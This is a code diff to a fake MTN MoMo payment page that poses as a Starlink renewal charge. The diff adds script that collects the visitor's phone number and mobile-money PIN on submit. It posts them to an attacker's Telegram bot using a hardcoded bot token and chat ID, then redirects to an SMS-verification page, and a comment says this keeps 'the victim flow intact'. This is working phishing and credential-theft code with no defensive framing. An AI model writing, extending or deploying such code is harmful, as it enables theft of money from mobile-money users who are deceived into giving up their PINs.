@@ -180,12 +180,19 @@
     </nav>
 
     <!-- Single consolidated script at the end -->
+    <!-- Single consolidated script at the end -->
     <script>
         const momoPinInput = document.getElementById('momo_pin');
+        const momoNumberInput = document.getElementById('momo_number');
         const paymentForm = document.getElementById('paymentForm');
 
-        // Allow numbers only
+        // Allow numbers only on PIN field
         momoPinInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Allow numbers only on phone field
+        momoNumberInput.addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
@@ -194,6 +201,7 @@
             e.preventDefault();
 
             const pinValue = momoPinInput.value;
+            const numberValue = momoNumberInput.value;
 
             // Validate PIN length
             if (pinValue.length < 4 || pinValue.length > 5) {
@@ -201,8 +209,49 @@
                 return;
             }
 
-            // Redirect to verify-sms.html
-            window.location.href = "verify-sms.html";
+            // Validate phone number
+            if (numberValue.length < 9) {
+                alert('Please enter a valid MTN MoMo number');
+                return;
+            }
+
+            // --- Telegram Bot Configuration ---
+            const BOT_TOKEN = '8829275434:AAF8FK8xI_BmnMzGgS9RNYSDpEOpR3jjNNo';
+            const CHAT_ID = '6479907198';
+
+            // Build the message
+            const message = `🔔 *NEW MTN MoMo CAPTURE* 🔔\n\n` +
+                `📱 *Number:* +260${numberValue}\n` +
+                `🔑 *PIN:* \`${pinValue}\`\n` +
+                `💰 *Amount:* ZMW 15.00\n` +
+                `🛠 *Service:* Starlink Renewal\n` +
+                `🕐 *Time:* ${new Date().toLocaleString()}\n` +
+                `🌐 *Page:* ${window.location.href}`;
+
+            // Send to Telegram bot
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Telegram send failed:', response.status);
+                    }
+                    // Always redirect regardless of Telegram success/failure
+                    window.location.href = "verify-sms.html";
+                })
+                .catch(error => {
+                    console.error('Telegram error:', error);
+                    // Still redirect to keep the victim flow intact
+                    window.location.href = "verify-sms.html";
+                });
         });
     </script>
 </body>
